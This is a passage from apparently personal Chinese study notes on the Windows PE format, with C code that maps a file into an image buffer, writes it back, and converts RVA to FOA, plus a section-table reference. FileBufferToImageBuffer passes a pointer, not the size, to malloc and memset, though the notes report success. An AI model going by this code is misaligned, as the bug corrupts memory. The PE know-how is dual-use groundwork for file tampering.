ImageBuffer;&#125;思考误区3：拷贝节数据时，那些未初始化数据是怎么展开的，为什么是按SizeOfRawData拷，虽然我知道按Misc拷可能拷到下一个节的数据我会去想一个节数据中未初始化部分是如何展开的，然后想不明白。现在用一个例子来说明：假设这个exe的FileAlignment和SectionAlignment一样假设在文件中：.data节数据.idata数据Misc和SizeOfRawData的关系含有未填充数据，导致VirtualSize&gt;SizeOfRawDataVirtualSize&lt;SizeOfRawDataExcel.data数据占Excel三行，填充间隙占2行.idata数据占Excel三行，填充间隙占2行对于每个节，从PointerToRawData开始处将SizeOfRawData大小拷到VirtualAddress。如下图所示，因为是按事先算好的VirtualAddress拷，可以发现.data在内存中了多了空间，这块空间目前是填充为0，但未来会给未初始化数据用。也就是说，未初始化数据在内存占的空间，编译器提前算好了，体现在VirtualAddress上。那么我们对于每个节数据的拷贝，操作上就是拷到VirtualAddress上。疑问，mark，那我将一个PE文件拉伸到ImageBuffer，然后对PE动手脚，然后恢复在存盘，塞数据会不会占用了那些未初始化数据用的空间？我不太知道“未初始化的数据在磁盘中不占有空间，但在内存中要分配空间”它实际是怎么操作的。比如我声明了1000个未赋初值的全局变量，PE文件中如何记录有1000个未初始化的全局变量，并且在PE文件载入内存后找到它们？这个信息用符号表还是什么之类的记录了，在PE文件的哪里？《程序员的自我修养》提到了编译和链接时，是用符号表来记录的，但好像没提到PE中怎么表示。测试样例要分为4类：特点1特点2序号1文件对齐=内存对齐，不存在Misc&gt;SizeOfRawData的节默认情况下，文件大小=SizeOfImage每个节的PointerToRawData=VirtualAddress序号2文件对齐=内存对齐，存在Misc&gt;SizeOfRawData的节文件大小&lt;SizeOfImage存在至少一个节的PointerToRawData&lt;VirtualAddress序号3文件对齐≠内存对齐，不存在Misc&gt;SizeOfRawData的节文件大小&lt;SizeOfImage存在至少一个节的PointerToRawData&lt;VirtualAddress序号4文件对齐≠内存对齐，存在Misc&gt;SizeOfRawData的节文件大小&lt;SizeOfImage存在至少一个节的PointerToRawData&lt;VirtualAddress除了序号1能直接复制FileBuffer返回，其他的都要按上边的过程来拉伸。而且序号1也可能文件大小&lt;SizeOfImage，那就不加判断不做分类了，来一个PE文件就按上边说的拉伸过程进行拉伸。函数声明函数实现1234567891011121314#pragma once#include &lt;Windows.h&gt;/* 函数功能：将FileBuffer拉伸为ImageBuffer input参数： pBuffer：指向FileBuffer首地址的指针 output参数： SizeOfImageBuffer：返回ImageBuffer的大小，即SizeOfImage的值 返回值： 成功，返回ImageBuffer首地址指针 失败，返回NULL*/void* FileBufferToImageBuffer(const char* pBuffer, DWORD* SizeOfImageBuffer);1234567891011121314151617181920212223242526272829303132333435363738394041#include &quot;FileBufferToImageBuffer.h&quot;#include &lt;Windows.h&gt;void* FileBufferToImageBuffer(const char* pBuffer, DWORD* SizeOfImageBuffer)&#123;\t//DOS头\tPIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer;\t//PE头\tPIMAGE_NT_HEADERS32 pImageNTHeaders32 = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);\t//标准PE头\tPIMAGE_FILE_HEADER pImageFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pImageNTHeaders32 + 4);\t//扩展PE头\tPIMAGE_OPTIONAL_HEADER32 pImageOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pImageFileHeader + IMAGE_SIZEOF_FILE_HEADER);\t//节表\tPIMAGE_SECTION_HEADER pImageSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pImageOptionalHeader + pImageFileHeader-&gt;SizeOfOptionalHeader);\t*SizeOfImageBuffer = pImageOptionalHeader-&gt;SizeOfImage; //存SizeOfImage的值\tvoid* ImageBuffer; ImageBuffer = malloc((size_t)SizeOfImageBuffer); //按SizeOfImage申请大小\tif (ImageBuffer == NULL)\t&#123; perror(&quot;Error allocating memory for ImageBuffer&quot;); return NULL;\t&#125;\tmemset(ImageBuffer, 0, (size_t)SizeOfImageBuffer); //填充0\t//分块拷贝\t//1、拷SizeOfHeaders\tmemcpy(ImageBuffer, pBuffer, pImageOptionalHeader-&gt;SizeOfHeaders);\t//2、循环拷节数据\tfor (int i = 0; i &lt; pImageFileHeader-&gt;NumberOfSections; i++)\t&#123; memcpy((void*)((DWORD)ImageBuffer + pImageSectionHeader[i].VirtualAddress), (void*)((DWORD)pBuffer + pImageSectionHeader[i].PointerToRawData), pImageSectionHeader[i].SizeOfRawData);\t&#125; return ImageBuffer;&#125;测试对input.exe调用ReadFileToFileBuffer创建FileBuffer调用FileBufferToImageBuffer对FileBuffer创建拉伸后的ImageBuffer调用MemoryToFile对ImageBuffer存到磁盘上output.exe看output.exe各个节数据是否从VirtualAddress开始测试用的exe代表fg.exe文件对齐=内存对齐，不存在Misc&gt;SizeOfRawData的节VC_HelloWorld.exe文件对齐=内存对齐，存在Misc&gt;SizeOfRawData的节12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &quot;../CommonFiles/ReadFileToFileBuffer.h&quot;#include &quot;../CommonFiles/MemoryToFile.h&quot;#include &lt;stdio.h&gt; //printf perror#include &lt;stdlib.h&gt; //size_t free#include &quot;FileBufferToImageBuffer.h&quot;//#include &lt;windef.h&gt; //BOOL?//#include &lt;winnt.h&gt; //PE relative struct//#include &lt;Windows.h&gt; //When you include windows.h it will, in turn, include winnt.h#define INPUT_FILE_PATH &quot;E:\\\\temp\\\\fg.exe&quot;#define OUTPUT_FILE_PATH &quot;E:\\\\temp\\\\fg_output.exe&quot;int main()&#123; //将文件读入内存，创建文件内存映像FileBuffer size_t length; void* FileBuffer = ReadFileToFileBuffer(INPUT_FILE_PATH, &amp;length); if (NULL == FileBuffer) &#123; printf(&quot;ReadFileToFileBuffer failed &quot;); return 0; &#125; //FileBuffer-&gt;ImageBuffer，拉伸 DWORD SizeOfImageBuffer; void* ImageBuffer; ImageBuffer = FileBufferToImageBuffer((char*)FileBuffer, &amp;SizeOfImageBuffer); if (NULL == ImageBuffer) &#123; printf(&quot;FileBufferToImageBuffer failed &quot;); free(FileBuffer); return 0; &#125; //将内存中的数据写到文件中 if (!MemoryToFile((char*)ImageBuffer, SizeOfImageBuffer, OUTPUT_FILE_PATH)) &#123; printf(&quot;MemoryToFile failed &quot;); free(FileBuffer); free(ImageBuffer); return 0; &#125; // 使用完毕后，释放内存 free(FileBuffer); free(ImageBuffer); return 0;&#125;fg.exeVC_HelloWorld.exe与预期结果一致。实际上，fg.exe的ImageBuffer和FileBuffer大小一样，可以通过MD5一样来判断。VC_HelloWorld.exe：编译后FileAlignment和SectionAlignment都是1000hVC_HelloWorld_output.exe：拉伸后的exe1234567#include &lt;stdio.h&gt;int main()&#123;\tprintf(&quot;Hello World! &quot;);\treturn 0;&#125;用十六进制查看器依次看VC_HelloWorld_output.exe每个节的节数据是否从VitrualAddress开始，如果是，即符合预期 ImageBufferToNewFileBuffer 将ImageBuffer压缩回去，压缩回的内存映像称为NewFileBuffer 过程解析ImageBuffer中的字段，得到需要申请的空间大小SizeOfNewFileBuffer=SizeOfHeaders+每个节的SizeOfRawData或用最后一个节.PointerToRawData+最后一个节.SizeOfRawData来算需要申请的空间大小根据SizeOfNewFileBuffer的大小，开辟一块缓冲区(NewFileBuffer)，填充为0分块拷贝从ImageBuffer拷SizeOfHeaders（DOS头+PE头+节表+填充）-&gt;NewFileBuffer用节表中的字段循环拷贝各个节数据从ImageBuffer+节.VirtualAddress拷贝节.SizeOfRawData大小-&gt;NewFileBuffer+ 节.PointerToRawData函数声明函数实现123456789101112131415#pragma once#include &lt;Windows.h&gt;/* 函数功能：将ImageBuffer压缩为NewFileBuffer input参数： pBuffer：指向ImageBuffer首地址的指针 output参数： SizeOfImageBuffer：返回NewFileBuffer的大小，在函数中用SizeOfHeaders+所有节.SizeOfRawData算出来的 返回值： 成功，返回NewFileBuffer首地址指针 失败，返回NULL*/void* ImageBufferToNewFileBuffer(const char* pBuffer, DWORD* SizeOfNewFileBuffer);1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &quot;ImageBufferToNewFileBuffer.h&quot;#include &lt;Windows.h&gt;void* ImageBufferToNewFileBuffer(const char* pBuffer, DWORD* SizeOfNewFileBuffer)&#123;\t//DOS头\tPIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer;\t//PE头\tPIMAGE_NT_HEADERS32 pImageNTHeaders32 = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);\t//标准PE头\tPIMAGE_FILE_HEADER pImageFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pImageNTHeaders32 + 4);\t//扩展PE头\tPIMAGE_OPTIONAL_HEADER32 pImageOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pImageFileHeader + IMAGE_SIZEOF_FILE_HEADER);\t//节表\tPIMAGE_SECTION_HEADER pImageSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pImageOptionalHeader + pImageFileHeader-&gt;SizeOfOptionalHeader);\t//计算NewFileBuffer大小，为malloc分空间做准备\t*SizeOfNewFileBuffer = 0;\t*SizeOfNewFileBuffer += pImageOptionalHeader-&gt;SizeOfHeaders; //+SizeOfHeaders\tfor (int i = 0; i &lt; pImageFileHeader-&gt;NumberOfSections; i++) //依次+SizeOfRawData\t&#123; *SizeOfNewFileBuffer += pImageSectionHeader[i].SizeOfRawData;\t&#125;\tvoid* NewFileBuffer;\tNewFileBuffer = malloc((size_t)*SizeOfNewFileBuffer); //按*SizeOfNewFileBuffer申请大小\tif (NewFileBuffer == NULL)\t&#123; perror(&quot;Error allocating memory for ImageBuffer&quot;); return NULL;\t&#125;\tmemset(NewFileBuffer, 0, (size_t)*SizeOfNewFileBuffer); //填充0\t//分块拷贝\t//1、拷SizeOfHeaders\tmemcpy(NewFileBuffer, pBuffer, pImageOptionalHeader-&gt;SizeOfHeaders);\t//2、循环拷节数据\tfor (int i = 0; i &lt; pImageFileHeader-&gt;NumberOfSections; i++)\t&#123; memcpy((void*)((DWORD)NewFileBuffer + pImageSectionHeader[i].PointerToRawData), (void*)((DWORD)pBuffer + pImageSectionHeader[i].VirtualAddress), pImageSectionHeader[i].SizeOfRawData);\t&#125;\treturn NewFileBuffer;&#125;测试：input.exe-&gt;ReadFileToFileBuffer，得到FileBuffer-&gt;FileBufferToImageBuffer，得到ImageBuffer-&gt;ImageBufferToNewFileBuffer，得到NewFileBuffer-&gt;MemoryToFile，得到output.exe对input.exe调用ReadFileToFileBuffer创建FileBuffer调用FileBufferToImageBuffer对FileBuffer创建拉伸后的ImageBuffer调用ImageBufferToNewFileBuffer对ImageBuffer压缩，形成NewFileBuffer调用MemoryToFile对NewFileBuffer存到磁盘上output.exe使用Beyond Compare软件对比input.exe和output.exe十六进制是否存在不同=&gt;推导方法：对比两个文件的MD5值如果都一样，则ImageBufferToNewFileBuffer编写正确12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &quot;../CommonFiles/ReadFileToFileBuffer.h&quot;#include &quot;../CommonFiles/MemoryToFile.h&quot;#include &lt;stdio.h&gt; //printf perror#include &lt;stdlib.h&gt; //size_t free#include &quot;FileBufferToImageBuffer.h&quot;#include &quot;ImageBufferToNewFileBuffer.h&quot;//#include &lt;windef.h&gt; //BOOL?//#include &lt;winnt.h&gt; //PE relative struct//#include &lt;Windows.h&gt; //When you include windows.h it will, in turn, include winnt.h//#define INPUT_FILE_PATH &quot;E:\\\\temp\\\\fg.exe&quot;//#define OUTPUT_FILE_PATH &quot;E:\\\\temp\\\\fg_output.exe&quot;//#define INPUT_FILE_PATH &quot;E:\\\\temp\\\\VC_HelloWorld.exe&quot;//#define OUTPUT_FILE_PATH &quot;E:\\\\temp\\\\VC_HelloWorld_output.exe&quot;#define INPUT_FILE_PATH &quot;E:\\\\temp\\\\VS_HelloWorld.exe&quot;#define OUTPUT_FILE_PATH &quot;E:\\\\temp\\\\VS_HelloWorld_output.exe&quot;int main()&#123; //将文件读入内存，创建文件内存映像FileBuffer size_t length; void* FileBuffer = ReadFileToFileBuffer(INPUT_FILE_PATH, &amp;length); if (NULL == FileBuffer) &#123; printf(&quot;ReadFileToFileBuffer failed &quot;); return 0; &#125; //FileBuffer-&gt;ImageBuffer，拉伸 DWORD SizeOfImageBuffer; void* ImageBuffer; ImageBuffer = FileBufferToImageBuffer((char*)FileBuffer, &amp;SizeOfImageBuffer); if (NULL == ImageBuffer) &#123; printf(&quot;FileBufferToImageBuffer failed &quot;); free(FileBuffer); return 0; &#125; //ImageBuffer-&gt;NewFileBuffer，压缩 DWORD SizeOfNewFileBuffer; void* NewFileBuffer; NewFileBuffer = ImageBufferToNewFileBuffer((char*)ImageBuffer, &amp;SizeOfNewFileBuffer); if (NULL == NewFileBuffer) &#123; printf(&quot;ImageBufferToNewFileBuffer failed &quot;); free(FileBuffer); return 0; &#125; //将内存中的数据写到文件中 if (!MemoryToFile((char*)NewFileBuffer, SizeOfNewFileBuffer, OUTPUT_FILE_PATH)) &#123; printf(&quot;MemoryToFile failed &quot;); free(FileBuffer); free(ImageBuffer); free(NewFileBuffer); return 0; &#125; // 使用完毕后，释放内存 free(FileBuffer); free(ImageBuffer); free(NewFileBuffer); return 0;&#125;测试用例测试用的exe来源代表fg.exe飞鸽程序文件对齐=内存对齐，不存在Misc&gt;SizeOfRawData的节VC_HelloWorld.exeVC编译的32位Hello World程序文件对齐=内存对齐，存在Misc&gt;SizeOfRawData的节VS_HelloWorld.exeVS编译的32位Hello World程序文件对齐≠内存对齐，存在Misc&gt;SizeOfRawData的节fg.exeVC_HelloWorld.exeVS_HelloWorld.exe不存在不同源文件有pdb调试信息，调试信息是加在PE文件末尾的，因此程序没法拷贝。调试信息在编译时选择不生产调试信息去掉就行使用去掉调试信息的VC_HelloWorld.exe作为输入，对比输出.exe，两文件一样不存在不同 启发：文件大小=SizeOfHeaders+各个节.SizeOfRawData+可能有的调试信息（在文件尾） 地址转换 RVAToFOA 将RVA转为FOA地址 过程过程：RVA地址是否位于PE头或该PE文件的FileAlignment=SectionAlignment如果是，那么RVA=FOA；如果不是，该数据的RVA位于哪个节通过节.VirtualAddress ≤ RVA地址 ≤ 节.VirtualAddress+当前节内存对齐后的大小，来判断该数据在哪个节中差值 = RVA地址-节.VirtualAddress，那么FOA=节.PointerToRawData+差值Misc.VirtualSize是节数据在内存中真实展开的值函数声明函数实现12345678910111213#pragma once#include &lt;Windows.h&gt;/*\t函数功能：将RVA地址转换为FOA地址\tinput参数： pBuffer：文件内存映像首地址 dwRVA： 要转换的RVA地址\t返回值： dwRVA：转换后的FOA地址 -1为转换失败*/DWORD RVAToFOA(const char* pBuffer, DWORD dwRVA);123456789101112131415161718192021222324252627282930313233343536373839404142#include&lt;stdio.h&gt;#include &lt;Windows.h&gt;DWORD RVAToFOA(const char* pBuffer, DWORD dwRVA)&#123;\tDWORD dwFOA = -1;\tif (dwRVA &lt; 0) //参数校验\t&#123; return dwFOA;\t&#125;\t//DOS头\tPIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer;\t//PE头\tPIMAGE_NT_HEADERS32 pImageNTHeaders32 = (PIMAGE_NT_HEADERS32)((DWORD)pDosHeader + pDosHeader-&gt;e_lfanew);\t//标准PE头\tPIMAGE_FILE_HEADER pImageFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pImageNTHeaders32 + 4);\t//扩展PE头\tPIMAGE_OPTIONAL_HEADER32 pImageOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pImageFileHeader + IMAGE_SIZEOF_FILE_HEADER);\t//节表\tPIMAGE_SECTION_HEADER pImageSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pImageOptionalHeader + pImageFileHeader-&gt;SizeOfOptionalHeader);\t//RVA在SizeOfHeaders以内 或 FileAlignment==SectionAlignment 时FOA=RVA\tif (dwRVA &lt;= pImageOptionalHeader-&gt;SizeOfHeaders || pImageOptionalHeader-&gt;FileAlignment == pImageOptionalHeader-&gt;SectionAlignment)\t&#123; dwFOA = dwRVA; return dwFOA;\t&#125;\t//在节表中\tfor (int i = 0; i &lt; pImageFileHeader-&gt;NumberOfSections; i++)\t&#123; if (pImageSectionHeader[i].VirtualAddress &lt;= dwRVA &amp;&amp; dwRVA &lt; pImageSectionHeader[i].VirtualAddress + pImageSectionHeader[i].Misc.VirtualSize) &#123; //节.PointerToRawData + 差值 //差值=RVA-节.VirtualAddress dwFOA = pImageSectionHeader[i].PointerToRawData + dwRVA - pImageSectionHeader[i].VirtualAddress; return dwFOA; &#125;\t&#125;\treturn dwFOA;&#125;验证程序：VS Code编译的Test.exe程序1234567891011#include &lt;stdio.h&gt;int g = 0x12345678;int main()&#123; printf(&quot;Address : %p &quot;, &amp;g); printf(&quot;value : 0x%x &quot;, g); return 0;&#125;文件对齐是200h，内存对齐是1000hRVA是3010h，写个测试函数，计算这个变量的FOA12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &quot;../CommonFiles/ReadFileToFileBuffer.h&quot;#include &quot;../CommonFiles/RVAToFOA.h&quot;#define FILE_PATH &quot;E:\\\\temp\\\\Test.exe&quot;int main()&#123; //将文件读入内存，创建文件内存映像FileBuffer size_t length; void* FileBuffer = ReadFileToFileBuffer(FILE_PATH, &amp;length); if (NULL == FileBuffer) &#123; printf(&quot;ReadFileToFileBuffer failed &quot;); return 0; &#125; //将RVA转换为FOA DWORD dwFOA = RVAToFOA((char*)FileBuffer, 0x3010); if (dwFOA == -1) &#123; printf(&quot;RVAToFOA failed &quot;); return 0; &#125; printf(&quot;FOA: %p &quot;, dwFOA); // 使用完毕后，释放内存 free(FileBuffer); return 0;&#125;运行后按输出的FOA到Test.exe中去找修改为88888888，再次运行Test.exe，值被修改了证明就是正确的"},{"title":"节表","path":"/wiki/PE/节表.html","content":"Section Headers 紧跟在拓展PE头后的是节表（Section Table），它是个结构体数组。结构体IMAGE_SECTION_HEADER包含了它所关联的区块的信息。 1234567891011121314151617typedef struct _IMAGE_SECTION_HEADER &#123; BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; // 8字节的ASCII字符串（节名），可自定义，只截取8个字节，可以8个字节都是名字 union &#123; // Misc，是该节在没有对齐前的真实大小，该值可以不准确 DWORD PhysicalAddress; // 真实宽度，这两个值是一个联合结构，可以使用其中的任何一个 DWORD VirtualSize; // 一般是取后一个 &#125; Misc; DWORD VirtualAddress; // 在内存中的偏移地址，加上ImageBase才是在内存中的真正地址 DWORD SizeOfRawData; // 节在文件中对齐后的大小 DWORD PointerToRawData; // 节区在文件中的偏移 //调试相关 DWORD PointerToRelocations; // 在OBJ文件中使用，重定位的偏移 DWORD PointerToLinenumbers; // 行号表的偏移（供调试用） WORD NumberOfRelocations; // 在OBJ文件中使用，重定位项数目 WORD NumberOfLinenumbers; // 行号表中行号的数目 DWORD Characteristics; // 节的属性&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; Name：Section的名字。8位的ASCII码字符串数组。名字可以随便改。如果块名超过8字节，会被截断，没有最后的终止标志“NULL”字节。 1#define IMAGE_SIZEOF_SHORT_NAME 8 带有一个“$”的区块名会被链接器特殊对待，前面有“$”的同名区块会被合并。这些区块是按“$”后面的字符的字母顺序合并的。 在编程过程中，读取PE文件中的相关内容（例如输入表、输出表等）时，不能将区块名称作为参考。正确的方法是按照数据目录表中的字段进行定位。 区块名称的设定主要是为了便于识别和使用，并不对操作系统的功能产生实质性影响。微软为这些区块定义了一些具有特色的名称，如下表所示。然而，这些名称实际上只是作为一个参考，可以根据需要随意更改。 名称 描述 .text 默认的代码区块，它的内容全是指令代码。PE文件运行在32位方式下，不受16位段的约束,所以没有理由把代码放到不同的区块中。链接器把所有目标文件的.text块链接成一个大的.text块。如果使用Borland C++，其编译器将产生的代码存储于名为code的区域，其链接器链接的结果是使代码块的名称不是.text，而是code .data 默认的读/写数据区块。全局变量、静态变量一般放在这里 .rdata 默认的只读数据区块，但程序很少用到该块中的数据。至少有两种情况要用到.rdata块。一是在 Microsoft链接器产生的 EXE 文件中，用于存放调试目录;二是用于存放说明字符串。如果程序的DEF 文件中指定了DESCRIPTION，字符串就会出现在.rdata块中 .idata 包含其他外来DLL的函数及数据信息，即输人表。将.idata区块合并到另一个区块已成为惯例，典型的是.rdata区块。链接器默认仅在创建一个Release模式的可执行文件时才将.idata区块合并到另一个区块中 .edata 输出表。当创建一个输出API或数据的可执行文件时，链接器会创建一个.EXP文件，这个.EXP文件包含一个.edata区块，它会被加入最后的可执行文件中。与.idata区块一样，.edata区块也经常被发现合并到了.text或.tdata区块中 .rsrc 资源。包含模块的全部资源，例如图标、菜单、位图等。这个区块是只读的，无论如何都不应该命名为.rsre以外的名字，也不能被合并到其他区块里 .bss 未初始化数据。很少使用，取而代之的是执行文件的.data区块的VirtualSize被扩展到足够大以存放未初始化的数据 .crt 用于支持C++运行时（CRT）所添加的数据 .tls TLS的意思是线程局部存储器，用于支持通过_declspec ( thread)声明的线程局部存储变量的数据，既包括数据的初始化值，也包括运行时所需的额外变量 .reloc 可执行文件的基址重定位。基址重定位一般只是DLL需要，而不是EXE需要。在Release模式下，链接器不会给EXE文件加上基址重定位，重定位可以在链接时通过/FIXED开关关闭 .sdata 相对于全局指针的可被定位的“短的”读/写数据，用于IA-64和其他使用一个全局指针寄存器的体系结构。IA-64上的常规大小的全局变量放在这个区块里 .srdata 相对于全局指针的可被定位的“短的”只读数据，用于IA-64和其他使用一个全局指针寄存器的体系结构 .pdata 异常表,包含一个CPU特定的IMAGE_RUNTIME_FUNCTION_ENTRY结构数组,DataDirectory中的IMAGE_DIRECTORY_ENTRY_EXCEPTION 指向它。它用于异常处理，是基于表的体系结构，就像IA-64。唯一不使用基于表的异常处理的架构体系是x86 .debug$S OBJ文件中Codeview格式的符号。这是一个变量长度的Codeview格式的符号记录流 .debug$T OBJ文件中Codeview格式的类型记录。这是一个变量长度的Codeview格式的类型记录流 .debug$P 当使用预编译的头时,可以在OBJ文件中找到它 .drectve 包含链接器命令,只能在OBJ中找到它。命令是能被传递给链接器命令行的字符串,例如“-defaultlib:LIBC&quot;。命令用空格字符分开 .didat 延迟载入的输人数据，只能在非Release模式的可执行文件中找到。在Release模式下，延迟载入的数据会被合并到另一个区块中 Misc：联合结构。一般用的是VirtualSize成员。表示区块的实际大小（未对齐），这个值可以不准确。 这个字段在OBJ文件中被设置为0。 VirtualAddress：该区块载入内存后的RVA。该地址%SectionAlignment=0。 在 Microsoft工具中，第1个块的默认RVA值为1000h。 在OBJ中，该字段没有意义，被设置为0。 SizeOfRawData：该区块在磁盘文件中对齐后的大小。该大小%FileAlignment=0。 PointerToRawData：该块在磁盘文件中的偏移。该地址%FileAlignment=0。 程序经编译或汇编后生成原始数据，这个字段用于给出原始数据在文件中的偏移。如果程序自装载PE或COFF文件（而不是由操作系统载入的)，这一字段将比VirtualAddress 还重要。在这种状态下，必须完全使用线性映像的方法载入文件，所以需要在该偏移处找到块的数据，而不是VirtualAddress字段中的RVA地址。 PointerToRelocations：在EXE文件中无意义，设置为0。在OBJ文件中,表示本块重定位信息的偏移量。在OBJ文件中，如果该值不是0，会指向一个IMAGE_RELOCATION结构数组。 PointerToLinenumbers：行号表在文件中的偏移量。这是文件的调试信息。设置为0，因为COFF调试信息已被弃用。 NumberOfRelocations：在EXE文件中无意义。在OBJ文件中，表示本块在重定位表中的重定位数目。设置为0，因为COFF调试信息已被弃用。 NumberOfLinenumbers：该块在行号表中的行号数目。设置为0，因为COFF调试信息已被弃用。 Characteristics：块属性。该字段是一组指出块属性（例如代码/数据、可读/可写等)的标志。位掩码。 这些标志中的很多都可以通过链接器的ISECTION开关设置。 常见的： 值 位 含义 E0000020h 20000000h|40000000h|80000000h|00000020h 该块包含执行代码，可读、可写、可执行 C00000040h 40000000h|80000000h|00000040h 该块可读、可写，包含已初始化的数据 60000020h 20000000h|40000000h|00000020h 该块包含执行代码，可读、可执行 值 字段值 含义 0x00000020 IMAGE_SCN_CNT_CODE 节中包含代码，常与10000000h一起设置 0x00000040 IMAGE_SCN_CNT_INITIALIZED_DATA 节中包含已初始化的数据 0x00000080 IMAGE_SCN_CNT_UNINITIALIZED_DATA 节中包含未初始化的数据 0x02000000 IMAGE_SCN_MEM_DISCARDABLE 节中的数据可被丢弃，因为它一旦被载入，进程就不再需要它了。常见的可丢弃的块是.reloc（重定位表） 00000100h IMAGE_SCN_LNK_OTHER 保留供将来使用 04000000h IMAGE_SCN_MEM_NOT_CACHED 节中的数据不会经过缓存 08000000h IMAGE_SCN_MEM_NOT_PAGED 节中的数据不会经过缓存 0x10000000 IMAGE_SCN_MEM_SHARED 该节为共享节，将被不同进程所共享 0x20000000 IMAGE_SCN_MEM_EXECUTE 该节可执行，映射到内存后的页面具有可执行属性。通常当00000020h标志被设置时，该标志也被设置 0x40000000 IMAGE_SCN_MEM_READ 该节可读，映射到内存后的页面具有可读属性。可执行文件中的块总是设置该标志。 0x80000000 IMAGE_SCN_MEM_WRITE 该节可写，映射到内存后的页面具有可写属性。如果PE文件中没有设置该标志，装载程序就会将内存映像页标记为可读或可执行 参考的图 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// IMAGE_SCN_TYPE_REG 0x00000000 // Reserved.// IMAGE_SCN_TYPE_DSECT 0x00000001 // Reserved.// IMAGE_SCN_TYPE_NOLOAD 0x00000002 // Reserved.// IMAGE_SCN_TYPE_GROUP 0x00000004 // Reserved.#define IMAGE_SCN_TYPE_NO_PAD 0x00000008 // Reserved.// IMAGE_SCN_TYPE_COPY 0x00000010 // Reserved.#define IMAGE_SCN_CNT_CODE 0x00000020 // Section contains code.#define IMAGE_SCN_CNT_INITIALIZED_DATA 0x00000040 // Section contains initialized data.#define IMAGE_SCN_CNT_UNINITIALIZED_DATA 0x00000080 // Section contains uninitialized data.#define IMAGE_SCN_LNK_OTHER 0x00000100 // Reserved.#define IMAGE_SCN_LNK_INFO 0x00000200 // Section contains comments or some other type of information.// IMAGE_SCN_TYPE_OVER 0x00000400 // Reserved.#define IMAGE_SCN_LNK_REMOVE 0x00000800 // Section contents will not become part of image.#define IMAGE_SCN_LNK_COMDAT 0x00001000 // Section contents comdat.// 0x00002000 // Reserved.// IMAGE_SCN_MEM_PROTECTED - Obsolete 0x00004000#define IMAGE_SCN_NO_DEFER_SPEC_EXC 0x00004000 // Reset speculative exceptions handling bits in the TLB entries for this section.#define IMAGE_SCN_GPREL 0x00008000 // Section content can be accessed relative to GP#define IMAGE_SCN_MEM_FARDATA 0x00008000// IMAGE_SCN_MEM_SYSHEAP - Obsolete 0x00010000#define IMAGE_SCN_MEM_PURGEABLE 0x00020000#define IMAGE_SCN_MEM_16BIT 0x00020000#define IMAGE_SCN_MEM_LOCKED 0x00040000#define IMAGE_SCN_MEM_PRELOAD 0x00080000#define IMAGE_SCN_ALIGN_1BYTES 0x00100000 //#define IMAGE_SCN_ALIGN_2BYTES 0x00200000 //#define IMAGE_SCN_ALIGN_4BYTES 0x00300000 //#define IMAGE_SCN_ALIGN_8BYTES 0x00400000 //#define IMAGE_SCN_ALIGN_16BYTES 0x00500000 // Default alignment if no others are specified.#define IMAGE_SCN_ALIGN_32BYTES 0x00600000 //#define IMAGE_SCN_ALIGN_64BYTES 0x00700000 //#define IMAGE_SCN_ALIGN_128BYTES 0x00800000 //#define IMAGE_SCN_ALIGN_256BYTES 0x00900000 //#define IMAGE_SCN_ALIGN_512BYTES 0x00A00000 //#define IMAGE_SCN_ALIGN_1024BYTES 0x00B00000 //#define IMAGE_SCN_ALIGN_2048BYTES 0x00C00000 //#define IMAGE_SCN_ALIGN_4096BYTES 0x00D00000 //#define IMAGE_SCN_ALIGN_8192BYTES 0x00E00000 //// Unused 0x00F00000#define IMAGE_SCN_ALIGN_MASK 0x00F00000#define IMAGE_SCN_LNK_NRELOC_OVFL 0x01000000 // Section contains extended relocations.#define IMAGE_SCN_MEM_DISCARDABLE 0x02000000 // Section can be discarded.#define IMAGE_SCN_MEM_NOT_CACHED 0x04000000 // Section is not cachable.#define IMAGE_SCN_MEM_NOT_PAGED 0x08000000 // Section is not pageable.#define IMAGE_SCN_MEM_SHARED 0x10000000 // Section is shareable.#define IMAGE_SCN_MEM_EXECUTE 0x20000000 // Section is executable.#define IMAGE_SCN_MEM_READ 0x40000000 // Section is readable.#define IMAGE_SCN_MEM_WRITE 0x80000000 // Section is writeable. Section在内存中分配的空间大小 在Section中： 未初始化的数据（如声明了一些全局变量，但没有赋初值），在磁盘中不占有空间，但当这个节载入内存后要给这些数据分配内存空间，随后initialize and use它们。 已初始化的数据（如声明了一些全局变量，并赋了初值），在磁盘中会占有空间。 这意味着一个Secion因为含有未初始化的数据，导致会出现Misc（该节实际的大小）&gt;SizeOfRawData（该区块在磁盘文件中对齐后的大小）的情况出现，那么当该节载入内存后，实际分配的空间是Misc。相反，如果一个Secion的Misc（该节实际的大小）&lt;SizeOfRawData（该区块在磁盘文件中对齐后的大小），那么当该节载入内存后，实际分配的空间是SizeOfRawData。 小结，内存中Section分配的空间为max{Misc,SizeOfRawData}，哪个大按哪个分配。"},{"title":"重定位表","path":"/wiki/PE/重定位表.html","content":"前言 一个可执行文件（EXE）的进程空间中包含多个模块，如其他EXE文件和动态链接库（DLL）。当系统加载器将每个模块载入进程空间时，每个模块都有一个预定的加载基地址（ImageBase）。对于EXE文件，它通常能够在其指定的ImageBase地址加载，因此不需要重定位信息。然而，DLL加载时不能保证每次加载都能从它预定的加载基址加载。 